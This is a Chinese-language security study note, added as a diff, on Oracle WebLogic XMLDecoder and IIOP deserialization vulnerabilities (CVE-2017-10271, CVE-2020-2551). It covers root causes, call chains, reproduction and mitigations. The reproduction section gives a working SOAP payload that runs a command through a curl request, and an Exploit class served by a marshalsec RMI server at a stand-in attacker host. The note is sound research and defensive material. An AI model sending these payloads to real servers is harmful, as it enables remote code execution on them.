@@ -1,0 +1,183 @@
+## 1. 概述
+
+Oracle WebLogic Server 是一个广泛使用的 Java EE 应用服务器，其复杂性和丰富的功能也使其成为安全研究的重点目标。历史上，WebLogic 曾多次曝出高危远程代码执行（RCE）漏洞，其中很大一部分与 Java 的反序列化机制有关。
+
+本笔记将深入探讨两类对 WebLogic 产生过严重影响的反序列化漏洞：
+
+1.  **XMLDecoder 反序列化漏洞**：主要涉及 `wls-wsat` 组件在处理 SOAP 请求时，由于不当使用 `XMLDecoder` 解析 XML 数据而导致的远程代码执行。相关漏洞包括 CVE-2017-3506、CVE-2017-10271 和 CVE-2019-2725。
+2.  **IIOP 协议反序列化漏洞**：利用 WebLogic 对 IIOP（互联网内部对象请求代理协议）的实现缺陷，通过该协议传输恶意的序列化对象，从而触发 RCE。典型代表为 CVE-2020-2551。
+
+本文档旨在通过对这两类漏洞的技术原理、环境准备、实战复现和关键细节的分析，为安全研究人员和开发人员提供一份高质量的学习参考。
+
+## 2. 技术原理
+
+### 2.1 XMLDecoder 反序列化
+
+#### 核心原理
+
+Java 的 `XMLDecoder` 类用于读取通过 `XMLEncoder` 创建的 XML 文档，并用其还原 Java 对象。它在设计上可以解析 XML 并创建相应的 Java 对象，甚至调用对象的方法。当应用程序直接使用 `XMLDecoder` 解析来自外部的、不受信任的 XML 数据时，攻击者可以构造恶意的 XML，定义任意对象（如 `java.lang.ProcessBuilder`）并调用其方法（如 `start()`），从而导致远程代码执行。
+
+`XMLDecoder` 的危险性在于它能直接执行 XML 中定义的指令：
+
+-   `xmlDecoder.readObject()`：触发反序列化过程，解析 XML 并创建对象。
+-   `<object class="java.lang.ProcessBuilder">...</object>`：指定要实例化的类。
+-   `<void method="start"/>`：调用已创建对象的方法。
+
+#### WebLogic 中的漏洞成因
+
+在受影响的 WebLogic 版本中，`wls-wsat` (Web Services Atomic Transactions) 组件对外提供 WebService 服务。当处理传入的 SOAP 请求时，其 `WorkContext` 处理器会使用 `XMLDecoder` 来解析 SOAP Header 中的 XML 数据，这为攻击者提供了执行任意代码的入口。
+
+**简要调用链分析 (以 CVE-2017-10271 为例):**
+
+攻击者发送的恶意 SOAP 请求首先被 WebLogic 的 WebService 栈接收，最终传递到 `WorkContext` 的处理逻辑中。
+
+```
+// 攻击流量进入
+-> weblogic.wsee.jaxws.workcontext.WorkContextServerTube.processRequest()
+  -> weblogic.wsee.jaxws.workcontext.WorkContextTube.readHeaderOld()
+    -> weblogic.workarea.WorkContextMapImpl.receiveRequest()
+      -> weblogic.workarea.spi.WorkContextEntryImpl.readEntry()
+        -> weblogic.wsee.workarea.WorkContextXmlInputAdapter.readUTF() // 在此方法内部，创建并使用了 XMLDecoder 解析 XML 数据
+          -> new XMLDecoder(is).readObject(); // 漏洞触发点
+```
+
+### 2.2 IIOP 协议反序列化
+
+#### IIOP 协议简介
+
+IIOP (Internet Inter-ORB Protocol) 是一种用于在不同 CORBA (Common Object Request Broker Architecture) 实现之间进行通信的协议。它允许一个程序（客户端）调用另一个程序（服务端）中的对象方法，即使它们是用不同语言编写或运行在不同机器上。本质上，IIOP 是一种用于分布式对象通信的底层协议，其通信过程中会涉及到对象的序列化与反序列化。
+
+#### WebLogic 中的漏洞成因 (CVE-2020-2551)
+
+WebLogic 实现了 IIOP 协议，并默认开放了相应的服务端口（通常与 T3 协议端口相同）。攻击者可以利用 IIOP 协议与 WebLogic 进行通信，并发送一个恶意的序列化对象。当 WebLogic 的 IIOP 服务端在处理这个对象时，会调用其 `readObject()` 方法，从而触发反序列化流程。
+
+CVE-2020-2551 的关键在于找到一个存在于 WebLogic classpath 中、并且其 `readObject()` 方法内存在危险操作的 "Gadget" 类。`com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager` 类恰好满足这个条件。它的 `readObject()` 方法中会执行 JNDI (Java Naming and Directory Interface) 查找操作，攻击者可以控制 JNDI 的 URL，使其指向一个恶意的 RMI/LDAP 服务器，从而加载并执行远程的恶意类文件，最终实现 RCE。
+
+**简要调用链分析:**
+
+```
+// 漏洞触发点
+-> JtaTransactionManager.readObject() // Gadget 的入口
+  -> this.initUserTransactionAndTransactionManager(); // 调用了包含 JNDI lookup 的方法
+    -> new InitialContext().lookup(this.userTransactionName); // JNDI 注入点，userTransactionName 可控
+
+// IIOP 协议处理流程
+-> IIOPInputStream.read_value() // 读取 IIOP 消息中的序列化数据
+  -> ValueHandlerImpl.readValue()
+    -> ObjectStreamClass.readObject() // 调用 Gadget 的 readObject 方法
+      -> Method.invoke()
+        -> JtaTransactionManager.readObject() // 最终触发 Gadget
+```
+
+## 3. 环境准备
+
+要复现这些漏洞，您需要一个存在漏洞的 WebLogic Server 环境。
+
+-   **软件**：Oracle WebLogic Server (例如 10.3.6.0 或 12.1.3.0)
+-   **操作系统**：Windows 或 Linux
+-   **JDK 版本**：建议使用与 WebLogic 版本兼容的 JDK (如 JDK 6 或 JDK 7)。
+
+您可以参考以下资源或官方文档来搭建一个基础的 WebLogic 环境：
+> [CSDN - Oracle WebLogic Server 12c (12.2.1.3) 安装配置教程](https://blog.csdn.net/counsellor/article/details/114527476)
+
+搭建完成后，请确保 WebLogic 服务正在运行，并且您可以访问其管理控制台（默认为 `http://<IP>:7001/console`）。
+
+## 4. 实战示例
+
+**警告：** 以下操作仅用于授权的渗透测试和安全研究。未经授权的攻击是违法行为。
+
+### 4.1 复现 XMLDecoder 反序列化 (CVE-2017-10271)
+
+此漏洞利用非常直接，只需向 `wls-wsat` 组件的端点发送一个特制的 SOAP 请求即可。
+
+1.  **目标**：运行在 `192.168.110.77:7001` 的 WebLogic 服务。
+2.  **工具**：`curl` 或 Burp Suite 等 HTTP 请求工具。
+3.  **攻击 Payload**：
+
+以下 Payload 尝试在目标服务器上执行 `calc.exe`（计算器程序），这是验证漏洞存在的经典 PoC。
+
+```bash
+curl -v -X POST -H "Content-Type: text/xml" --data @payload.xml http://192.168.110.77:7001/wls-wsat/CoordinatorPortType
+```
+
+其中 `payload.xml` 文件的内容如下：
+
+```xml
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+    <soapenv:Header>
+        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+            <java version="1.6.0" class="java.beans.XMLDecoder">
+                <object class="java.lang.ProcessBuilder">
+                    <array class="java.lang.String" length="1">
+                        <void index="0">
+                            <string>calc.exe</string>
+                        </void>
+                    </array>
+                    <void method="start"/>
+                </object>
+            </java>
+        </work:WorkContext>
+    </soapenv:Header>
+    <soapenv:Body/>
+</soapenv:Envelope>
+```
+
+发送请求后，如果目标服务器存在漏洞且运行在 Windows 系统上，将会弹出计算器程序。在 Linux 系统上，可以将命令替换为 `touch /tmp/pwned` 等。
+
+### 4.2 复现 IIOP 协议反序列化 (CVE-2020-2551)
+
+此漏洞的利用相对复杂，需要结合 JNDI 注入。
+
+1.  **准备 JNDI Server**：
+    使用类似 `marshalsec` 的工具，在攻击者控制的服务器上启动一个恶意的 RMI 或 LDAP 服务。该服务将在被查询时返回一个包含恶意代码的远程对象。
+
+    ```bash
+    # 编译一个恶意类 Exploit.java，例如在构造函数中执行命令
+    public class Exploit {
+        public Exploit() {
+            try {
+                Runtime.getRuntime().exec("calc.exe");
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
+    }
+
+    # 启动 RMI 服务器
+    java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://<ATTACKER_IP>/#Exploit" 9999
+    ```
+
+2.  **构造并发送 IIOP 请求**：
+    编写一个 Java 客户端或使用现成的 PoC 脚本，通过 IIOP 协议连接到 WebLogic 的端口（如 7001）。在请求中，将 `JtaTransactionManager` 对象序列化，并将其 `userTransactionName` 属性设置为我们刚刚搭建的恶意 JNDI 地址 `rmi://<ATTACKER_IP>:9999/Exploit`。
+
+    当 WebLogic 的 IIOP 服务端接收并反序列化这个 `JtaTransactionManager` 对象时，会触发 JNDI 查询，从而远程加载并执行 `Exploit.class`，实现 RCE。
+
+    > **注意**：完整的 PoC 代码较为复杂，通常涉及手动构建 IIOP 报文或使用特定的 Java RMI/IIOP 库。您可以参考网络上公开的 CVE-2020-2551 PoC 项目来执行此步骤。
+
+## 5. 关键细节
+
+-   **XMLDecoder vs ObjectInputStream**：`XMLDecoder` 是一种特殊的反序列化方式，它处理的是文本格式的 XML，而不是 `ObjectInputStream` 处理的二进制流。但两者都能从不可信的输入中重建对象，从而引发安全风险。
+-   **WLS-WSAT 组件**：`wls-wsat` 组件不是 WebLogic 默认安装的核心组件，但在很多企业应用场景中会被启用。检查 `/wls-wsat/CoordinatorPortType` 路径是否可访问是判断漏洞是否存在的第一步。
+-   **CVE-2017-3506 vs CVE-2017-10271**：这两个漏洞原理几乎相同，都是 XMLDecoder 反序列化。后者是对前者补丁的绕过。CVE-2019-2725 则是针对 `_async` 路径的另一个绕过，本质一脉相承。
+-   **IIOP 协议的普遍性**：IIOP 协议默认与 T3 协议共用端口。这意味着只要 WebLogic 的管理端口对外开放，就可能暴露 IIOP 攻击面。
+-   **Gadget 的重要性**：无论是 T3、IIOP 还是其他二进制反序列化漏洞，其利用都依赖于目标应用 Classpath 中存在的 "Gadget" 链。CVE-2020-2551 的成功利用，正是因为找到了 `JtaTransactionManager` 这个强大的 JNDI 注入 Gadget。
+
+## 6. 安全总结与缓解措施
+
+WebLogic 的反序列化漏洞是持久且高危的威胁。作为防御方，应采取多层次的纵深防御策略。
+
+1.  **及时更新补丁**：
+    这是最根本、最有效的措施。Oracle 会定期发布关键补丁更新（CPU），应第一时间评估并应用到生产环境中，修复已知的反序列化漏洞。
+
+2.  **网络访问控制**：
+    -   将 WebLogic 的管理端口（如 7001）和不必要的服务（如 IIOP）置于内网，或使用严格的防火墙策略限制对其的访问。
+    -   除非业务必需，否则不要将 WebLogic 的管理控制台暴露在公网上。
+
+3.  **禁用非必要组件**：
+    如果业务不需要 Web Services Atomic Transactions 功能，可以考虑通过删除 `wls-wsat.war` 包并重启 WebLogic 来禁用该组件，从而彻底消除 XMLDecoder 相关的攻击面。
+
+4.  **使用 Web 应用防火墙 (WAF)**：
+    部署 WAF 并开启针对 WebLogic 反序列化漏洞的虚拟补丁或检测规则。WAF 可以有效拦截包含恶意 XML 或序列化数据的请求，作为补丁更新前的临时缓解措施。
+
+5.  **监控与日志审计**：
+    对 WebLogic 的访问日志和错误日志进行持续监控。异常的 URL 访问（如 `/wls-wsat/`）或反序列化错误堆栈信息可能是攻击正在发生的迹象。
